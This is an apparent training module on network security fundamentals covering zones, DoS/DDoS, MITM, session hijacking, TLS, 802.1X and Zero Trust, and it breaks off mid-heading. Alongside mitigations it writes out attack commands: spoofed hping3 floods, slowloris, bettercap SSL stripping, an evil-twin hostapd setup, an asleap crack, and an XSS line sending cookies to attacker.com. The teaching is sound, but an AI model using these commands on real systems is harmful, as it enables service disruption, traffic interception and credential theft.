---
title: "Module 04 — Network Security Fundamentals"
tags: [networking, security, cia-triad, defence-in-depth, dos, ddos, mitm, tls, 802.1x, radius, nac, zero-trust, pentest, netgod]
module: 4
date: 2026-04-05
---

# Module 04 — Network Security Fundamentals

> [!info] Module Overview
> This module builds the security mindset framework applied throughout all other modules. CIA Triad, network security zones, defence in depth, attack taxonomy, all DoS/DDoS types, MITM mechanics, session hijacking, TLS internals, 802.1X/RADIUS/NAC, and Zero Trust architecture — all taken to depth with engineering implementation and attacker perspective on each.

---

## 1. CIA Triad Applied to Networking

The CIA Triad — **Confidentiality, Integrity, Availability** — is the foundational model for evaluating security controls. Every security decision maps to one or more of these three properties. Every attack targets one or more of them.

### Confidentiality

**Definition**: Ensuring that data is accessible only to authorised parties. Unauthorised disclosure is a confidentiality breach.

**What confidentiality protects against**: Eavesdropping, packet capture, data exfiltration, credential theft.

**Network controls that enforce confidentiality**:
- **Encryption in transit**: TLS for application traffic, IPsec for VPNs, SRTP for VoIP, SSH instead of Telnet/FTP
- **Encryption at rest**: BitLocker, dm-crypt for stored data
- **Network segmentation**: VLANs, firewalls, and ACLs limit which systems can see which traffic — an attacker on the guest Wi-Fi should not be able to reach the server VLAN
- **Access control**: 802.1X ensures only authenticated devices join the network; ACLs restrict which hosts can communicate
- **Switching security**: DAI prevents ARP spoofing which would enable traffic interception; DHCP snooping prevents rogue DHCP which redirects traffic

**Examples of confidentiality failures in networking**:
- HTTP instead of HTTPS — credentials and session tokens transmitted in cleartext
- Telnet instead of SSH — entire terminal session visible on wire
- SNMP v1/v2c — community strings and MIB data in cleartext
- Wi-Fi with WEP or no encryption — all wireless traffic capturable
- Flat network with no VLAN segmentation — compromised device can ARP-spoof and capture all LAN traffic

### Integrity

**Definition**: Ensuring that data has not been modified in transit or at rest by unauthorised parties. Unauthorised modification is an integrity breach.

**What integrity protects against**: MITM data injection, route poisoning, DNS cache poisoning, firmware tampering.

**Network controls that enforce integrity**:
- **MACs (Message Authentication Codes)**: Part of every TLS session — each record is authenticated. Any modification detected and session torn down.
- **Digital signatures**: DNSSEC signs DNS records — modifications detected. Code signing — OS only runs signed firmware.
- **OSPF/EIGRP/BGP authentication**: MD5 or SHA authentication on routing protocol packets — rogue route injections rejected
- **SMB signing**: Cryptographically signs SMB packets — prevents NTLM relay and injection
- **HTTPS certificate pinning**: Prevents MITM with fake certificates

**Examples of integrity failures**:
- OSPF without authentication — attacker injects routes, redirecting traffic
- DNS without DNSSEC — cache poisoning redirects users to malicious servers
- SMB signing not required — NTLM relay attack modifies auth exchange
- BGP without authentication — BGP hijacking (attacker announces victim's prefix, traffic redirected)

### Availability

**Definition**: Ensuring that systems and services are accessible to authorised users when needed. Disruption or denial of service is an availability breach.

**What availability protects against**: DoS/DDoS, STP loops, broadcast storms, resource exhaustion, hardware failures.

**Network controls that enforce availability**:
- **Redundancy**: Dual ISP links, redundant switches (STP/RSTP), EtherChannel, HSRP/VRRP for gateway redundancy
- **DoS protection**: Rate limiting, SYN cookies, traffic scrubbing, CDN-based DDoS mitigation
- **STP stability**: BPDU Guard, Root Guard, PortFast — prevent STP reconvergence storms
- **QoS**: Prioritise critical traffic (VoIP, management) even during congestion
- **Resource monitoring**: SNMP, NetFlow, SIEM — detect anomalies before outages

**Examples of availability failures**:
- No STP → broadcast storm crashes entire network
- No rate limiting on internet edge → SYN flood exhausts server resources
- No DHCP snooping → DHCP starvation leaves clients without IP addresses
- Single ISP link with no failover → ISP outage = total internet loss
- CAM table overflow → switch floods all traffic → performance collapse

---

## 2. Network Security Zones

Security zones are logical or physical segments of a network with different trust levels and different security controls applied between them. The fundamental principle: **traffic between zones must pass through a security enforcement point** (firewall, proxy, or IDS/IPS).

### Standard Zone Model

```
Internet
    │
    │  (Untrusted — assume hostile)
    ▼
┌─────────────────────┐
│   INTERNET EDGE     │  Firewall 1 (External)
│   (Perimeter FW)    │
└─────────────────────┘
    │
    │  (Semi-trusted — accessible from internet, isolated from internal)
    ▼
┌─────────────────────┐
│        DMZ          │  Web servers, mail relays, DNS resolvers,
│  (Demilitarised     │  reverse proxies, VPN concentrators
│     Zone)           │
└─────────────────────┘
    │
    │  (Trusted — internal corporate network)
    ▼
┌─────────────────────┐
│   INTERNAL ZONE     │  Firewall 2 (Internal)
│                     │
│  ┌───────────────┐  │
│  │ USER VLAN     │  │  Workstations, laptops
│  ├───────────────┤  │
│  │ SERVER VLAN   │  │  Application servers, file servers
│  ├───────────────┤  │
│  │ DB VLAN       │  │  Databases (most restricted — no direct internet)
│  └───────────────┘  │
└─────────────────────┘
    │
    ▼
┌─────────────────────┐
│  MANAGEMENT ZONE    │  Out-of-band management — switches, routers,
│  (Highly Restricted)│  firewalls, iDRAC/iLO, jump servers
└─────────────────────┘
```

### Zone Definitions and Controls

**Untrusted Zone (Internet)**:
- All traffic assumed hostile
- No trust relationship
- Controls: Ingress filtering (block RFC 1918 source IPs), egress filtering (block spoofed traffic leaving), DDoS scrubbing

**DMZ (Demilitarised Zone)**:
- Hosts services that must be accessible from the internet
- Semi-trusted: accessible from internet for specific services only
- Isolated from internal network — a compromised DMZ host should not give access to internal systems
- Controls: Inbound rules strictly limited to required ports (e.g., TCP 80/443 to web servers only), no direct DMZ-to-internal connections initiated by DMZ hosts

**Internal Zone**:
- Corporate users and systems
- Trusted but not unconditionally — internal threats are real
- Sub-segmented by function: user VLAN cannot reach database VLAN directly
- Controls: Inter-VLAN firewall rules, NAC (802.1X), endpoint security, IDS/IPS

**Management Zone**:
- The most sensitive zone — contains network device management interfaces
- Compromise of management zone = control of entire network infrastructure
- Controls: Accessible only from dedicated jump servers, strong MFA required, all traffic logged, no internet access

**Database Zone**:
- Contains databases — highest sensitivity data
- No direct internet access, ever
- Only application servers in the server VLAN can connect to DB zone on specific ports
- Controls: Strict firewall rules (application server IP → DB port only), DB activity monitoring

### Zero Trust vs Perimeter Security

**Traditional perimeter model**: "Everything inside the firewall is trusted." — This model fails because:
- Insider threats (malicious or compromised employees)
- Lateral movement: once an attacker breaches the perimeter, they move freely inside
- Cloud and remote work: the "inside" no longer exists as a fixed boundary

**Zero Trust**: "Never trust, always verify." — Covered in depth in Section 8.

---

## 3. Defence in Depth

Defence in depth is the strategy of deploying **multiple layers of security controls** so that if one layer fails, others still protect the asset. No single control is assumed to be sufficient.

```
Layer 1 — Physical Security
    Locked comms rooms, badge access, CCTV, cable management
    
Layer 2 — Network Perimeter
    Firewall, IPS, DDoS protection, ingress/egress filtering
    
Layer 3 — Network Segmentation
    VLANs, inter-VLAN firewall rules, DMZ architecture
    
Layer 4 — Host-Based Controls
    Host firewall, endpoint detection, patch management, AV
    
Layer 5 — Application Layer
    WAF, input validation, authentication, session management
    
Layer 6 — Data Layer
    Encryption at rest, DLP, database access controls, backups
    
Layer 7 — Monitoring and Response
    SIEM, IDS/IPS, NetFlow, alerting, incident response plan
```

**Why depth matters — a real attack chain example**:
```
Attacker sends phishing email → 
  Layer 6 fails: user clicks link, downloads malware
    Layer 4 fails: AV misses zero-day payload
      Layer 3 applies: malware can only reach internet, not internal servers (segmentation)
      → Attacker cannot pivot to database
      Layer 7 applies: SIEM detects unusual outbound connection
      → Alert raised, IR team responds before data exfiltrated
```

Each layer reduced the blast radius. No single layer was sufficient alone.

---

## 4. Attack Categories — Recon to Exfiltration

The standard attack lifecycle maps directly to network layers and protocols:

```
Phase 1 — Passive Reconnaissance (OSINT)
  Target: Public information, DNS records, WHOIS, certificate transparency
  No packets sent to target → undetectable
  Tools: whois, dig, crt.sh, Shodan, LinkedIn
  Network layer: N/A (internet-based research)

Phase 2 — Active Reconnaissance / Scanning
  Target: Live hosts, open ports, service versions, OS fingerprints
  Packets sent to target → detectable by IDS
  Tools: Nmap, Masscan, Netdiscover, arp-scan
  Network layer: Layer 3/4 (IP/TCP/UDP/ICMP)

Phase 3 — Enumeration
  Target: Users, groups, shares, DNS zones, SNMP MIBs
  Active interaction with services → high detectability
  Tools: enum4linux, ldapdomaindump, snmpwalk, gobuster
  Network layer: Layer 7 (application protocols)

Phase 4 — Exploitation
  Target: Vulnerable services, weak credentials, misconfigurations
  Attempt to gain initial access
  Tools: Metasploit, manual exploit, Hydra, custom scripts
  Network layer: Layer 7 primarily, Layer 3/4 for network exploits

Phase 5 — Post-Exploitation / Lateral Movement
  Target: Other internal hosts, privilege escalation
  Tools: Mimikatz, Impacket, BloodHound, Chisel
  Network layer: Layer 2/3 (ARP spoofing, pivoting) + Layer 7 (SMB, WMI, RDP)

Phase 6 — Persistence
  Target: Maintaining access after initial foothold removed
  Tools: Scheduled tasks, services, startup registry keys, implants
  Network layer: Layer 7 (C2 channels — HTTP/S, DNS, ICMP tunnels)

Phase 7 — Exfiltration
  Target: Extract high-value data from the network
  Tools: Custom scripts, DNS tunnelling, HTTPS C2, cloud storage abuse
  Network layer: Layer 7 (disguised as legitimate traffic)
```

---

## 5. DoS and DDoS — All Attack Types

### DoS vs DDoS

**DoS (Denial of Service)**: A single source attacks a target. Easier to mitigate — block the source IP.

**DDoS (Distributed Denial of Service)**: Many sources (often thousands of compromised hosts forming a botnet) attack a single target simultaneously. The aggregate traffic overwhelms the target or its upstream links. Cannot be mitigated by blocking a single IP.

### Volumetric Attacks (Bandwidth Exhaustion)

Goal: Flood the target's internet uplink with more traffic than it can handle. The link becomes saturated — legitimate traffic cannot get through.

**UDP Flood**: Send massive volumes of UDP packets to random ports on the target. Target responds with ICMP port-unreachable messages (or drops packets). Amplified with spoofed source IPs — target's response traffic goes to innocent third parties.

**ICMP Flood (Ping Flood)**: Flood the target with ICMP Echo Requests. Target's CPU is consumed processing and responding.

**Amplification Attacks**: The most powerful volumetric technique. Attacker sends small requests with **spoofed source IP = victim's IP** to many open servers. Servers send large responses to the victim. Attacker uses minimal bandwidth; victim receives massive traffic.

```
Amplification Ratio (bytes out / bytes in):
DNS ANY query:   1:100+ (small query → large ANY response)
NTP monlist:     1:206  (small monlist request → list of 600 clients)
SNMP GetBulk:    1:1700 (extreme amplification)
Memcached:       1:51000 (extreme — Memcached DDoS 2018 broke records)
```

```bash
# Conceptual — attacker sends (DO NOT DO THIS):
hping3 --udp -p 53 --spoof <victim-IP> -d 50 --flood <open-DNS-resolver>
# Open DNS resolver receives query appearing from victim → sends large response to victim
```

**Smurf Attack** (largely mitigated by modern networks):
Send ICMP Echo Request with spoofed source = victim's IP to a network's broadcast address. All hosts on that network reply to the victim. Amplification = number of hosts on network.

Mitigation: `no ip directed-broadcast` on Cisco routers (disables forwarding broadcast pings).

### Protocol / State Exhaustion Attacks

Goal: Exhaust the target's connection state tables, CPU, or memory rather than its bandwidth.

**SYN Flood**:
Send thousands of SYN packets with spoofed source IPs. Server allocates state for each half-open connection (SYN_RECEIVED state), waiting for the final ACK that never comes. Server's TCP connection table fills up — legitimate connections rejected.

```bash
hping3 -S --flood -V -p 80 --rand-source <target>
# --rand-source: randomise source IP (spoofing — requires raw socket, usually root)
```

**Mitigation — SYN Cookies**:
Server does not allocate state when SYN received. Instead, encodes connection info in the ISN (Sequence Number) of the SYN-ACK. Only allocates state when valid ACK (containing the correct sequence number) arrives — proving the connection is real.

```bash
# Enable SYN cookies (Linux)
echo 1 > /proc/sys/net/ipv4/tcp_syncookies
# Or permanently:
sysctl -w net.ipv4.tcp_syncookies=1
echo "net.ipv4.tcp_syncookies=1" >> /etc/sysctl.conf
```

**SSL/TLS Exhaustion**:
TLS handshakes are computationally expensive (asymmetric crypto). Flooding a server with TLS handshake initiations exhausts its CPU — legitimate HTTPS connections fail.

**Mitigation**: TLS offloading to dedicated hardware (SSL accelerators, load balancers), rate limiting TLS handshakes per source IP.

**HTTP Slow Attacks**:

*Slowloris*: Open many HTTP connections to the server and send partial HTTP requests — just enough to keep the connection open (send headers very slowly). Server holds connections open waiting for completion. Connection pool exhausts — legitimate users can't connect.

```bash
# slowloris (Python tool)
slowloris 192.168.1.10 -p 80 -s 500    # Open 500 slow connections
```

*Slow Read*: Client advertises a very small TCP receive window — server sends data very slowly to avoid overwhelming the client. Server holds connections open, exhausting resources.

*RUDY (R-U-Dead-Yet)*: POST requests with a very long Content-Length but data sent one byte at a time — server waits for complete body.

**Mitigation for HTTP slow attacks**:
- Connection timeout settings (min-data-rate requirements)
- Nginx: `client_body_timeout`, `client_header_timeout`
- Apache: `mod_reqtimeout`
- Reverse proxy in front of application server

### Application Layer Attacks (Layer 7)

Goal: Exploit application logic to exhaust resources without requiring massive bandwidth. Often indistinguishable from legitimate traffic.

**HTTP Flood**: Simple — flood target with valid-looking GET or POST requests. Bypasses volumetric defences. Requires a large botnet or application-level rate limiting to defeat.

**DNS Query Flood**: Flood DNS server with queries for random subdomains (cache miss guaranteed). DNS server must query upstream for each — CPU exhaustion.

**Search/Database Exhaustion**: Flood a search feature or API endpoint that triggers heavy database queries — "1 request = 1000ms of DB CPU time".

**Mitigation for Layer 7 DDoS**:
- WAF (Web Application Firewall): Rate limiting per IP, CAPTCHA challenges, bot detection
- CDN with DDoS protection (Cloudflare, Akamai, AWS Shield)
- Geographic IP blocking
- Identifying and rate-limiting specific attack patterns (user agent, request patterns)

### Reflection Attacks

Attacker sends requests to legitimate servers with victim's spoofed source IP. Servers send their responses to the victim. The legitimate servers become unwitting participants.

```
Attacker (IP: 1.1.1.1, spoofing 10.0.0.1)
    │
    ├──→ Open DNS Resolver A: "Give me the ANY record for isc.org" (from: 10.0.0.1)
    ├──→ Open DNS Resolver B: "Give me the ANY record for isc.org" (from: 10.0.0.1)
    └──→ Open DNS Resolver C: ... (from: 10.0.0.1)

DNS Resolvers A, B, C → Victim (10.0.0.1): Large DNS response × 3
```

**Mitigation**:
- BCP38 (network ingress filtering) — ISPs should drop packets with spoofed source IPs
- Rate-limit DNS responses to any single IP
- Disable open DNS resolvers (only serve your own customers)

---

## 6. MITM — Man-in-the-Middle Attacks

A MITM attack positions the attacker between two communicating parties. The attacker can intercept, read, and modify traffic in both directions while both parties believe they are communicating directly with each other.

### MITM at Layer 2 — ARP Spoofing (Covered in Module 3)

The foundational MITM technique on local networks. Full attack detail in Module 3 ARP section.

### MITM at Layer 3 — ICMP Redirect

Send ICMP Type 5 (Redirect) messages to a host, telling it to use the attacker as the gateway for specific routes. Host updates its routing cache. Traffic for those routes now goes through attacker.

**Conditions required**: Attacker must be on the same subnet as victim, and victim must have ICMP redirects enabled.

```bash
hping3 --icmp --icmptype 5 -a <gateway-IP> --icmp-gw <attacker-IP> <victim-IP>
```

**Mitigation**: `net.ipv4.conf.all.accept_redirects=0`

### MITM at Layer 7 — SSL Stripping

SSL stripping downgrades HTTPS connections to HTTP. When a user navigates to `http://example.com`, the browser is redirected to `https://example.com`. The attacker intercepts the redirect and maintains an HTTP connection to the victim while establishing HTTPS with the server.

```
Victim → HTTP request to example.com → Attacker (MITM)
Attacker → HTTPS connection to example.com (real server)
Attacker → HTTP connection back to victim (downgraded)
Victim sends credentials over HTTP → Attacker captures them in cleartext
```

```bash
# bettercap SSL stripping
bettercap -iface eth0
> arp.spoof on
> set https.proxy.sslstrip true
> https.proxy on
```

**Mitigation — HSTS (HTTP Strict Transport Security)**:
Server sends header: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
Browser stores this — always uses HTTPS for this domain, never HTTP, even if HTTP is requested.

**HSTS Preloading**: Domains submit to the HSTS preload list (built into browsers). Even the first HTTP connection is blocked — browser already knows to use HTTPS. This defeats SSL stripping entirely.

### MITM via Rogue Access Point (Evil Twin)

Attacker creates a Wi-Fi AP with the same SSID as a legitimate network. Victim's device connects to the rogue AP (potentially deauthenticated from the real AP first). All traffic flows through attacker.

```bash
# hostapd — create rogue AP
# Create config file
cat > /tmp/rogue_ap.conf << EOF
interface=wlan0
driver=nl80211
ssid=TargetNetwork       # Same SSID as legitimate AP
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

hostapd /tmp/rogue_ap.conf

# Add DHCP (dnsmasq)
dnsmasq --interface=wlan0 --dhcp-range=192.168.99.100,192.168.99.200,12h \
  --dhcp-option=3,192.168.99.1 --dhcp-option=6,192.168.99.1

# Enable IP forwarding and NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

**Mitigation**:
- WPA2-Enterprise (802.1X) — clients authenticate to the network using certificates. Rogue AP cannot present valid certificate.
- WIDS (Wireless Intrusion Detection System) — detects duplicate SSIDs with different BSSIDs
- Certificate pinning in VPN clients — VPN connected before any application traffic

### MITM via BGP Hijacking

An attacker (or ISP with malicious/misconfigured BGP) announces a more specific route for a victim's IP prefix. Other ASes on the internet prefer this more specific route — traffic intended for the victim is redirected to the attacker.

**Real-world examples**:
- 2010: China Telecom briefly announced routes for ~37,000 US prefixes — large amounts of internet traffic routed through China for ~18 minutes
- 2018: Amazon Route 53 DNS traffic hijacked via BGP to steal cryptocurrency

**Mitigation**:
- RPKI (Resource Public Key Infrastructure) — cryptographically validates that AS X is authorised to announce prefix Y
- BGP route origin validation
- Monitoring services: BGPmon, RIPE NCC BGP route information service

---

## 7. Session Hijacking

Session hijacking takes over an authenticated session after it has been established — bypassing the login step by stealing or forging the session identifier.

### Web Session Hijacking

Web applications identify authenticated sessions using **session tokens** (cookies, URL parameters, or hidden form fields). If an attacker obtains a valid session token, they can make requests as that authenticated user.

**Methods to steal session tokens**:

**1. Network interception** (requires MITM or unencrypted traffic):
```bash
# Wireshark filter — look for Set-Cookie headers in HTTP responses
http.set_cookie
# Or in requests:
http.cookie
```

**2. XSS (Cross-Site Scripting)** — inject JavaScript that exfiltrates the cookie:
```javascript
// Attacker injects this script into the vulnerable page
document.location='https://attacker.com/steal?c='+document.cookie
// Or: new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)
```
Mitigation: `HttpOnly` cookie flag — JavaScript cannot access the cookie.

**3. Session fixation** — attacker sets the victim's session ID before login:
```
Attacker obtains a session token: GET /login.php → Set-Cookie: session=KNOWN_VALUE
Attacker sends victim a link: http://target.com/login?session=KNOWN_VALUE
Victim logs in → server associates their credentials with KNOWN_VALUE session
Attacker uses KNOWN_VALUE → authenticated as victim
```
Mitigation: Regenerate session token after successful authentication.

**4. Predictable session tokens** — generate tokens that can be guessed:
```python
# Example bad token generation (DON'T DO THIS):
session_id = str(user_id) + str(int(time.time()))
# Predictable: attacker knows user IDs and timestamps
```
Mitigation: Cryptographically random tokens (128+ bits from CSPRNG).

### TCP Session Hijacking (Network Level)

Covered in Module 3 TCP section. Requires predicting sequence numbers — only feasible with MITM position in modern networks due to random ISNs.

### Replay Attacks

A replay attack captures a valid authentication exchange and replays it to gain access without knowing the credentials.

**Example**: Kerberos ticket replay — if a TGT or Service Ticket is stolen from memory or the wire, it can be replayed to authenticate as that user until the ticket expires.

**Mitigation**:
- Timestamps and nonces in authentication protocols (Kerberos uses timestamps — replay window is 5 minutes)
- One-time tokens (TOTP — time-based one-time passwords)
- Challenge-response authentication (server sends a unique challenge per login attempt)

---

## 8. TLS 1.2 vs TLS 1.3

### TLS 1.2 — Still Widely Deployed

**Handshake overview** (already covered in Module 3 — summary here for comparison):
- 2 round trips (2-RTT) before data can flow
- Supports both RSA key exchange (no PFS) and ECDHE (PFS)
- Supports many cipher suites including weak ones (RC4, DES, export-grade)
- Must explicitly configure to remove weak ciphers

**Cipher suites in TLS 1.2**:
```
TLS_RSA_WITH_AES_128_CBC_SHA          ← No PFS (RSA key exchange)
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 ← PFS (ECDHE key exchange)
TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 ← PFS, ECDSA cert
```

**Perfect Forward Secrecy (PFS)**: If the server's private key is compromised later, recorded TLS 1.2 sessions using ephemeral key exchange (ECDHE/DHE) cannot be decrypted retroactively. Without PFS (RSA key exchange), recorded sessions can be decrypted if the private key is ever obtained.

### TLS 1.3 — Current Standard (RFC 8446, 2018)

**Key improvements**:
- **1-RTT handshake**: Faster connection establishment (1 round trip instead of 2)
- **0-RTT session resumption**: Client can send data in the very first message for resumed sessions (some replay risk — application must handle this)
- **Removed insecure features**: No RSA key exchange (PFS mandatory), no CBC cipher suites, no RC4, no MD5/SHA-1 in signatures, no renegotiation, no compression
- **Only 5 cipher suites** (all strong): AES-128-GCM-SHA256, AES-256-GCM-SHA384, CHACHA20-POLY1305-SHA256, AES-128-CCM-SHA256, AES-128-CCM-8-SHA256
- **Encrypted handshake**: Certificate is encrypted in TLS 1.3 — middleboxes cannot inspect server certificate (privacy improvement, breaks some DLP/inspection tools)

**TLS 1.3 Handshake**:
```
Client                                           Server
  |                                                |
  |─── ClientHello + KeyShare ─────────────────────>|
  |    (Client sends its DH key share immediately) |
  |                                                |
  |<── ServerHello + KeyShare ─────────────────────|
  |<── EncryptedExtensions (encrypted) ────────────|
  |<── Certificate (encrypted) ────────────────────|
  |<── CertificateVerify (encrypted) ──────────────|
  |<── Finished (encrypted) ───────────────────────|
  |                                                |
  |─── Finished (encrypted) ───────────────────────>|
  |                                                |
  |═══════════ Application Data (encrypted) ═══════|
```

Only 1 round trip. Server can send encrypted application data immediately after its first message in 0-RTT scenarios.

### Checking TLS Configuration

```bash
# testssl.sh — comprehensive TLS audit
testssl.sh https://target.com
# Reports: supported versions, cipher suites, PFS, HSTS, certificate validity,
#          known vulnerabilities (POODLE, BEAST, Heartbleed, CRIME, DROWN, ROBOT...)

# Nmap
nmap --script ssl-enum-ciphers -p 443 target.com
nmap --script ssl-cert -p 443 target.com

# OpenSSL
openssl s_client -connect target.com:443
openssl s_client -connect target.com:443 -tls1_2   # Force TLS 1.2
openssl s_client -connect target.com:443 -tls1_3   # Force TLS 1.3

# sslyze — Python TLS scanner
sslyze target.com
```

### TLS Vulnerabilities (Historical — Know These)

| Vulnerability | TLS Version Affected | Attack |
|--------------|---------------------|--------|
| POODLE | SSL 3.0 | CBC padding oracle — decrypt data |
| BEAST | TLS 1.0 | CBC IV predictability — decrypt data |
| CRIME | TLS 1.2 with compression | Compression oracle — recover session tokens |
| BREACH | HTTP compression | Similar to CRIME but at HTTP level |
| HEARTBLEED | OpenSSL implementation | Read server memory — extract private key |
| DROWN | Servers supporting SSLv2 | Cross-protocol attack — decrypt RSA traffic |
| ROBOT | RSA key exchange | Bleichenbacher attack — decrypt or sign |
| LUCKY13 | TLS/DTLS CBC | Timing side channel |

**Mitigation for all of the above**: Disable SSL 3.0 and TLS 1.0/1.1, disable RSA key exchange, disable TLS compression, keep OpenSSL patched, use TLS 1.3 wherever possible.

---

## 9. 802.1X — Port-Based Network Access Control

### What 802.1X Does

802.1X provides **port-based authentication** — a device must authenticate before the switch port or Wi-Fi access point allows any network access. Before authentication succeeds, the port is in an "unauthorised" state — only 802.1X authentication traffic is allowed through (EAP over LAN — EAPOL).

### The Three Players

```
Supplicant          Authenticator           Authentication Server
(Client device)     (Switch or AP)          (RADIUS server)
     │                    │                        │
     │──── EAPOL ─────────│                        │
     │   (Ethernet)       │──── RADIUS ────────────│
     │                    │   (UDP 1812/1813)      │
```

- **Supplicant**: The client device requesting access. Has 802.1X software (built into Windows, macOS, Linux, iOS, Android).
- **Authenticator**: The network device (switch port or Wi-Fi AP) that controls access. Passes EAP messages between supplicant and server without interpreting them.
- **Authentication Server**: Usually a RADIUS server (FreeRADIUS, Windows NPS, Cisco ISE) that validates credentials.

### EAP Methods

EAP (Extensible Authentication Protocol) is the framework. The actual credential exchange is defined by the EAP method:

| EAP Method | Credential Type | TLS Tunnel | Enterprise Use |
|-----------|----------------|------------|---------------|
| EAP-TLS | Client certificate | Yes | Most secure — mutual cert auth |
| PEAP-MSCHAPv2 | Username/password | Yes (server cert only) | Most common in enterprise |
| EAP-TTLS | Username/password | Yes | Similar to PEAP |
| EAP-MD5 | Password hash | No | Insecure — avoid |
| LEAP | Password | No | Cisco legacy — broken, avoid |

### 802.1X Authentication Flow (PEAP-MSCHAPv2)

```
Supplicant                Authenticator            RADIUS Server
    │                          │                        │
    │ (plugs in to switch)     │                        │
    │<─── EAP-Request/Identity─┤                        │
    │                          │                        │
    │──── EAP-Response/Identity─>│                      │
    │     "I am jsmith@corp"   │──── Access-Request ────>│
    │                          │     (username + EAP)   │
    │                          │                        │
    │                          │<─── Access-Challenge ──│
    │<─── EAP-Request ─────────┤     (EAP-TLS start)   │
    │                          │                        │
    │  [TLS tunnel established — server cert verified]  │
    │                          │                        │
    │──── MSCHAPv2 credentials ─>│─── Access-Request ──>│
    │     (inside TLS tunnel)  │   (credentials inside) │
    │                          │                        │
    │                          │<─── Access-Accept ─────│
    │<─── EAP-Success ─────────┤   (user validated)     │
    │                          │                        │
    │  [Port moves to Authorised state]                 │
    │  [Normal network traffic now allowed]             │
```

### RADIUS — Remote Authentication Dial-In User Service

RADIUS (RFC 2865) is the AAA protocol used with 802.1X:
- **Authentication**: Verifies identity (username/password, certificate)
- **Authorisation**: Determines what access is granted (VLAN assignment, ACLs)
- **Accounting**: Logs who connected, when, for how long (ports 1813)

**Ports**: UDP 1812 (auth), UDP 1813 (accounting)

**RADIUS packet types**:
| Code | Name | Direction |
|------|------|-----------|
| 1 | Access-Request | Authenticator → Server |
| 2 | Access-Accept | Server → Authenticator |
| 3 | Access-Reject | Server → Authenticator |
| 11 | Access-Challenge | Server → Authenticator |
| 4 | Accounting-Request | Authenticator → Server |
| 5 | Accounting-Response | Server → Authenticator |

**RADIUS shared secret**: The authenticator and RADIUS server share a secret to authenticate to each other. This shared secret is used to encrypt the user's password in the Access-Request.

### Cisco Switch 802.1X Configuration

```cisco
! Enable AAA
aaa new-model
aaa authentication dot1x default group radius
aaa authorization network default group radius
aaa accounting dot1x default start-stop group radius

! Configure RADIUS server
radius server CORP-RADIUS
 address ipv4 192.168.100.10 auth-port 1812 acct-port 1813
 key RADIUSsharedSecret123

! Enable 802.1X globally
dot1x system-auth-control

! Configure access port for 802.1X
interface GigabitEthernet0/1
 switchport mode access
 switchport access vlan 10
 authentication port-control auto    ! auto = 802.1X required
 dot1x pae authenticator
 spanning-tree portfast
 
! Dynamic VLAN assignment based on RADIUS response
 authentication event fail action authorize vlan 999    ! Quarantine VLAN on failure
 authentication event no-response action authorize vlan 999

! Verify
show authentication sessions
show dot1x all
```

### NAC — Network Access Control

NAC extends 802.1X with **posture assessment** — checking that the device meets security policy before granting access (not just authenticating the user):

- Is the OS patched?
- Is antivirus installed and up to date?
- Is disk encryption enabled?
- Is the device domain-joined?

Depending on posture result, the device is granted:
- **Full access** (passes all checks)
- **Remediation VLAN** (antivirus out of date — redirect to update server only)
- **Quarantine VLAN** (critical failure — no access)

**NAC solutions**: Cisco ISE, Forescout, Aruba ClearPass, Microsoft NPS + Network Policy

### Pentest Lens — 802.1X

**Bypassing 802.1X**:

*MAC address spoofing*: Some implementations fall back to MAC Authentication Bypass (MAB) for devices that don't support 802.1X (printers, IoT). If MAB is configured, spoofing a whitelisted MAC grants access.
```bash
# Identify MAC address of an already-connected device (e.g., a printer)
nmap -sn 192.168.1.0/24    # Or ARP sweep before authentication
ip link set eth0 address AA:BB:CC:DD:EE:FF    # Spoof the MAC
```

*VLAN hopping after authentication*: Authenticate legitimately, then use VLAN hopping techniques.

*Rogue device behind authenticated device*: Connect a switch behind an authenticated device — both share the authenticated port.

*EAP downgrade*: If the RADIUS server accepts weak EAP methods (EAP-MD5), attacker can capture and crack the challenge-response.

*PEAP without proper certificate validation*: If the supplicant doesn't validate the RADIUS server's certificate, an attacker can stand up a rogue RADIUS server that accepts any credentials and captures MSCHAPv2 hashes.
```bash
# hostapd-wpe — rogue RADIUS/AP for capturing PEAP credentials
# Captures MSCHAPv2 exchanges → crack with asleap or hashcat
asleap -C <challenge> -R <response> -W rockyou.txt
```

**Misconfigurations**:
- MAB fallback with no whitelist — any MAC gets access
- PEAP with no certificate validation on clients → rogue RADIUS trivial
- 802.1X not deployed at all — flat network with no access control
- RADIUS shared secret is weak/default

**Defender's counter**:
- EAP-TLS with client certificates — most secure (no password to capture)
- Validate RADIUS server certificate on all supplicants
- Disable MAB or restrict to a separate restricted VLAN
- Certificate-based 802.1X makes rogue RADIUS attacks ineffective

---

## 10. Zero Trust — Principles, Micro-Segmentation, Identity-Based Access

### The Zero Trust Model

Zero Trust (ZT) is a security paradigm where **no entity — user, device, or network — is implicitly trusted** based on its location. Access is granted only after verifying identity, device health, and context, and only for the specific resource needed (least privilege).

**Core principles**:
1. **Verify explicitly**: Always authenticate and authorise based on all available data points (identity, location, device health, service/workload, data classification, anomalies)
2. **Use least privilege access**: Limit access to only what is required. Just-In-Time (JIT) and Just-Enough-Access (JEA).
3. **Assume breach**: Minimise blast radius. Encrypt everything. Segment aggressively. Log everything. Assume an attacker is already inside.

### Why Zero Trust

Traditional perimeter model failure modes:
- VPN users are fully trusted once connected — a compromised VPN credential = access to everything inside
- Insider threats: employee with access to the internal network can reach any system
- Lateral movement: one compromised host in the trusted zone can reach all others

Zero Trust addresses all three by requiring authentication and authorisation for every access attempt, regardless of network location.

### Zero Trust Architecture Components

```
┌─────────────────────────────────────────────────────┐
│                  CONTROL PLANE                       │
│                                                     │
│  Identity Provider    Policy Engine    Trust Engine  │
│  (Azure AD, Okta)   (Access rules)   (Risk scoring) │
└───────────────────────┬─────────────────────────────┘
                        │ Policy decisions
┌───────────────────────▼─────────────────────────────┐
│                   DATA PLANE                         │
│                                                     │
│  Policy Enforcement Points (PEPs)                   │
│  - API Gateway                                      │
│  - Identity-Aware Proxy                             │
│  - Micro-segmentation firewall                      │
│  - CASB (Cloud Access Security Broker)              │
└─────────────────────────────────────────────────────┘
```

**Every access request passes through a PEP that enforces a policy decision from the control plane.**

### Micro-Segmentation

